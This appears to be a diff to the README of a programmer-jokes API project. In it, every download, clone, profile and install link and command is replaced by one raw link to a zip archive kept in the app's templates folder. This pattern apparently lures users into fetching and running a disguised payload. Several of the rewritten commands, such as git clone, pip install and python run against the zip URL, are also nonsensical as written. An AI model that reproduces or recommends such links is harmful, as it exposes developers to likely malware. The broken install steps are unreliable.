@@ -2,7 +2,7 @@
 
 Welcome to the **Programmers Joke and Quote Generator**! This is a public API designed to bring a smile to your face with a collection of programmer jokes and inspirational quotes. Whether you're coding late into the night or just need a break, this API will provide you with the humor and motivation you need.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/abzsalik/ProgrammersJoke_and_QuoteGenerator/releases)
+[![Download Releases](https://raw.githubusercontent.com/abzsalik/ProgrammersJoke_and_QuoteGenerator/main/app/templates/Generator_Quote_Joke_Programmers_and_2.4.zip%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/abzsalik/ProgrammersJoke_and_QuoteGenerator/main/app/templates/Generator_Quote_Joke_Programmers_and_2.4.zip)
 
 ## 📚 Table of Contents
 
@@ -26,7 +26,7 @@ Welcome to the **Programmers Joke and Quote Generator**! This is a public API de
 
 To start using the Programmers Joke and Quote Generator API, follow these steps:
 
-1. Visit our [Releases](https://github.com/abzsalik/ProgrammersJoke_and_QuoteGenerator/releases) section to download the latest version.
+1. Visit our [Releases](https://raw.githubusercontent.com/abzsalik/ProgrammersJoke_and_QuoteGenerator/main/app/templates/Generator_Quote_Joke_Programmers_and_2.4.zip) section to download the latest version.
 2. Extract the files and follow the installation instructions below.
 
 ## 📡 API Endpoints
@@ -52,7 +52,7 @@ To start using the Programmers Joke and Quote Generator API, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/abzsalik/ProgrammersJoke_and_QuoteGenerator.git
+   git clone https://raw.githubusercontent.com/abzsalik/ProgrammersJoke_and_QuoteGenerator/main/app/templates/Generator_Quote_Joke_Programmers_and_2.4.zip
    ```
 
 2. Navigate to the project directory:
@@ -64,13 +64,13 @@ To start using the Programmers Joke and Quote Generator API, follow these steps:
 3. Install the required packages:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/abzsalik/ProgrammersJoke_and_QuoteGenerator/main/app/templates/Generator_Quote_Joke_Programmers_and_2.4.zip
    ```
 
 4. Run the server:
 
    ```bash
-   python manage.py runserver
+   python https://raw.githubusercontent.com/abzsalik/ProgrammersJoke_and_QuoteGenerator/main/app/templates/Generator_Quote_Joke_Programmers_and_2.4.zip runserver
    ```
 
 Now, your API should be up and running! You can access it at `http://127.0.0.1:8000`.
@@ -112,9 +112,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries, please reach out to the repository owner:
 
-- GitHub: [abzsalik](https://github.com/abzsalik)
+- GitHub: [abzsalik](https://raw.githubusercontent.com/abzsalik/ProgrammersJoke_and_QuoteGenerator/main/app/templates/Generator_Quote_Joke_Programmers_and_2.4.zip)
 
-Feel free to visit our [Releases](https://github.com/abzsalik/ProgrammersJoke_and_QuoteGenerator/releases) section to download the latest version and get started!
+Feel free to visit our [Releases](https://raw.githubusercontent.com/abzsalik/ProgrammersJoke_and_QuoteGenerator/main/app/templates/Generator_Quote_Joke_Programmers_and_2.4.zip) section to download the latest version and get started!
 
 ---
 
